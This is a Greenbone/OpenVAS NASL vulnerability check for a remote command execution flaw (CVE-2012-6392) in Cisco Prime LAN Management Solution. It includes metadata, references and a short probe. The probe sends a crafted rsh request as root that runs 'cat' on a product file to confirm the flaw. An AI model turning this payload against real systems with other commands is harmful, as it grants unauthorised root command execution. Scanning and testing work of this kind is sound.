# Copyright (C) 2013 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.901215");
  script_version("2022-04-25T14:50:49+0000");
  script_tag(name:"last_modification", value:"2022-04-25 14:50:49 +0000 (Mon, 25 Apr 2022)");
  script_tag(name:"creation_date", value:"2013-01-24 16:05:48 +0530 (Thu, 24 Jan 2013)");
  script_cve_id("CVE-2012-6392");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("Cisco Prime LAN Management Solution Remote Command Execution Vulnerability");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_category(ACT_ATTACK);
  script_family("CISCO");
  script_dependencies("rsh.nasl", "os_detection.nasl");
  script_require_ports("Services/rsh", 514);
  script_mandatory_keys("Host/runs_unixoide");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/81110");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/57221");
  script_xref(name:"URL", value:"http://telussecuritylabs.com/threats/show/TSL20130118-01");
  script_xref(name:"URL", value:"http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20130109-lms");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to execute arbitrary command
  in the context of the root user.");

  script_tag(name:"affected", value:"Cisco Prime LMS Virtual Appliance Version 4.1 through 4.2.2 on Linux.");

  script_tag(name:"insight", value:"Flaw is due to improper validation of authentication and authorization
  commands sent to certain TCP ports.");

  script_tag(name:"solution", value:"Upgrade to Cisco Prime LMS Virtual Appliance to 4.2.3 or later.");

  script_tag(name:"summary", value:"Cisco Prime LAN Management Solution is prone to a remote command execution (RCE) vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("port_service_func.inc");

port = service_get_port(default:514, proto:"rsh");

soc = open_priv_sock_tcp(dport:port);
if(!soc)
  exit(0);

## nb: request which will cat command with lms.info file on the target
crafted_data = string('0\0', "root", '\0', "root", '\0',
                      'cat /opt/CSCOpx/setup/lms.info\0');

send(socket: soc, data: crafted_data);
res = recv(socket: soc, length: 2048);
close(soc);

if(res && "LAN Management Solution" >< res) {
  security_message(port: port);
  exit(0);
}

exit(99);
